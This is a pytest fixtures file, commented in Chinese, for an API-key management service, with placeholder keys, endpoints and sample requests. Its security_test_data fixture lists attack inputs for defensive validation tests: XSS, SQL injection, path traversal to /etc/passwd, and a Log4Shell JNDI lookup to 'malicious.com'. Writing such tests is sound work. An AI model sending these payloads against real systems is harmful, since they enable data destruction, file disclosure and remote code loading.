"""
测试配置文件
"""

import pytest
import sys
import os

# 添加项目根目录到Python路径
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

# 测试配置
pytest_plugins = []

# 测试 fixtures
@pytest.fixture
def sample_config():
    """示例配置数据"""
    return {
        "api_keys": {
            "openai": "sk-test-openai-key",
            "anthropic": "sk-test-anthropic-key"
        },
        "endpoints": {
            "openai": "https://api.openai.com/v1",
            "anthropic": "https://api.anthropic.com"
        },
        "rates": {
            "openai": {"rpm": 60, "tpm": 90000},
            "anthropic": {"rpm": 60, "tpm": 90000}
        }
    }

@pytest.fixture
def temp_config_file(sample_config, tmp_path):
    """临时配置文件"""
    import json
    
    config_file = tmp_path / "test_config.json"
    with open(config_file, 'w') as f:
        json.dump(sample_config, f)
    
    return str(config_file)

# 测试环境变量
@pytest.fixture
def mock_env_vars():
    """模拟环境变量"""
    import os
    from unittest.mock import patch
    
    env_vars = {
        "OPENAI_API_KEY": "sk-env-openai-key",
        "ANTHROPIC_API_KEY": "sk-env-anthropic-key"
    }
    
    with patch.dict(os.environ, env_vars):
        yield env_vars

# 测试日志配置
@pytest.fixture
def temp_log_file(tmp_path):
    """临时日志文件"""
    return str(tmp_path / "test.log")

# 测试加密密钥
@pytest.fixture
def encryption_key():
    """测试加密密钥"""
    return "test-encryption-key-12345678901234567890"

# 测试API密钥
@pytest.fixture
def test_api_keys():
    """测试API密钥"""
    return {
        "valid_openai": "sk-openai-1234567890abcdef",
        "valid_anthropic": "sk-ant-1234567890abcdef",
        "valid_news": "news-api-key-1234567890",
        "invalid_short": "short",
        "invalid_empty": "",
        "invalid_none": None
    }

# 测试服务配置
@pytest.fixture
def service_configs():
    """服务配置"""
    return {
        "openai": {
            "name": "OpenAI",
            "endpoint": "https://api.openai.com/v1",
            "key_pattern": "sk-"
        },
        "anthropic": {
            "name": "Anthropic",
            "endpoint": "https://api.anthropic.com",
            "key_pattern": "sk-ant-"
        },
        "news_api": {
            "name": "News API",
            "endpoint": "https://newsapi.org/v2",
            "key_pattern": ""
        }
    }

# 测试用户数据
@pytest.fixture
def test_users():
    """测试用户数据"""
    return [
        {
            "id": 1,
            "username": "testuser1",
            "email": "test1@example.com",
            "role": "admin"
        },
        {
            "id": 2,
            "username": "testuser2",
            "email": "test2@example.com",
            "role": "user"
        }
    ]

# 测试API请求
@pytest.fixture
def sample_api_requests():
    """示例API请求数据"""
    return [
        {
            "method": "POST",
            "endpoint": "/api/keys",
            "data": {"service": "openai", "key": "sk-test-key"}
        },
        {
            "method": "GET",
            "endpoint": "/api/keys",
            "data": None
        },
        {
            "method": "PUT",
            "endpoint": "/api/keys/openai",
            "data": {"service": "openai", "key": "sk-updated-key"}
        },
        {
            "method": "DELETE",
            "endpoint": "/api/keys/openai",
            "data": None
        }
    ]

# 测试响应数据
@pytest.fixture
def sample_api_responses():
    """示例API响应数据"""
    return {
        "success": {
            "status": "success",
            "message": "操作成功",
            "data": {"service": "openai", "key": "sk-***"}
        },
        "error": {
            "status": "error",
            "message": "操作失败",
            "error": "错误详情"
        },
        "validation_error": {
            "status": "error",
            "message": "验证失败",
            "errors": {"service": "服务名称不能为空"}
        }
    }

# 测试性能数据
@pytest.fixture
def performance_data():
    """性能测试数据"""
    return {
        "response_times": [0.1, 0.2, 0.15, 0.3, 0.25],
        "memory_usage": [50, 60, 55, 70, 65],
        "cpu_usage": [10, 15, 12, 20, 18]
    }

# 测试安全数据
@pytest.fixture
def security_test_data():
    """安全测试数据"""
    return {
        "malicious_inputs": [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "admin' OR '1'='1",
            "${jndi:ldap://malicious.com}"
        ],
        "valid_inputs": [
            "openai",
            "sk-1234567890abcdef",
            "https://api.openai.com/v1"
        ]
    }

# 测试边界情况
@pytest.fixture
def edge_cases():
    """边界测试数据"""
    return {
        "empty_strings": ["", "   ", "\t", "\n"],
        "null_values": [None, "null", "NULL"],
        "special_chars": ["@#$%^&*()", "[]{}", "<>?:", "|\\"],
        "unicode_chars": ["中文", "日本語", "한국어", "🔑"],
        "large_numbers": [999999999, 1000000000],
        "zero_values": [0, 0.0, False]
    }